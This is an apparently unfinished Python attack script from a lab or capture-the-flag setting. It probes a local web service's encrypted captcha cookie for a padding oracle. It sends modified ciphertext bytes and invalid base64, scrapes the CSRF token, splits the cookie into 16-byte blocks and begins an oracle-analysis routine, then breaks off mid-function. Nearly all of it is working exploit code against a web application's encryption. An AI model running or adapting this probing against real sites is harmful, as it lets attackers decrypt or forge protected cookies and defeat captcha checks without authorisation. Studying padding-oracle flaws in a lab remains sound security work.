import requests
import base64
import sys
import time

# Configuration
BASE_URL = "http://127.0.0.1:32834"
COOKIE_VALUE = "2mArom13+gd4q/dQTQu4aFVpwOkejaqPtWuV0Kyn2ls="
BLOCK_SIZE = 16

# Create session
session = requests.Session()

# First, get baseline responses to understand the oracle
print("[+] Getting baseline responses...")

# Test with original cookie (should work)
original_ciphertext = base64.b64decode(COOKIE_VALUE)
response = session.post(BASE_URL, data={'csrf_token': 'test', 'username': 'test', 'captcha': 'test', 'submit': 'Submit'}, cookies={'captcha': COOKIE_VALUE})
print(f"[+] Original cookie - Status: {response.status_code} | Length: {len(response.text)}")
if len(response.text) < 500:
    print(f"[+] Response preview: {response.text[:200]}")

# Test with random modified cookie (should fail)
import os
random_bytes = bytearray(original_ciphertext)
random_bytes[0] = (random_bytes[0] + 1) % 256
modified_cookie = base64.b64encode(bytes(random_bytes)).decode()
response = session.post(BASE_URL, data={'csrf_token': 'test', 'username': 'test', 'captcha': 'test', 'submit': 'Submit'}, cookies={'captcha': modified_cookie})
print(f"[+] Modified cookie - Status: {response.status_code} | Length: {len(response.text)}")
if len(response.text) < 500:
    print(f"[+] Response preview: {response.text[:200]}")

# Test with completely invalid base64
response = session.post(BASE_URL, data={'csrf_token': 'test', 'username': 'test', 'captcha': 'test', 'submit': 'Submit'}, cookies={'captcha': 'invalid!base64'})
print(f"[+] Invalid base64 - Status: {response.status_code} | Length: {len(response.text)}")
if len(response.text) < 500:
    print(f"[+] Response preview: {response.text[:200]}")

# Get fresh CSRF token
response = session.get(BASE_URL)
import re
csrf_match = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', response.text)
csrf_token = csrf_match.group(1) if csrf_match else ""
print(f"[+] CSRF token: {csrf_token}")

# Decode the cookie
ciphertext = base64.b64decode(COOKIE_VALUE)
print(f"\n[+] Ciphertext length: {len(ciphertext)} bytes")
print(f"[+] Ciphertext (hex): {ciphertext.hex()}")

blocks = [ciphertext[i:i+BLOCK_SIZE] for i in range(0, len(ciphertext), BLOCK_SIZE)]
print(f"[+] Blocks: {len(blocks)}")
for i, block in enumerate(blocks):
    print(f"  Block {i}: {block.hex()}")

# Create a test to detect response differences
def analyze_oracle():
    """Analyze the padding oracle to understand response patterns"""
    print(f"\n{'='*60}")
    print("[*] Analyzing oracle behavior...")
    print(f"{'='*60}")
    
    # Test 1: Original cookie
    print("[1] Testing original cookie...")
    response1 = session.post(BASE_URL, data={'csrf_token': csrf_token, 'username': 'test', 'captcha': 'test', 'submit': 'Submit'}, cookies={'captcha': COOKIE_VALUE})
    print(f"    Status: {response1.status_code} | Length: {len(response1.text)}")
    if 'captcha' in response1.text.lower():
        print("    Contains: 'captcha'")
    
    # Test 2: Modify last byte of last block (should affect padding)
    print("\n[2] Testing modified padding...")
    test_ct = bytearray(original_ciphertext)
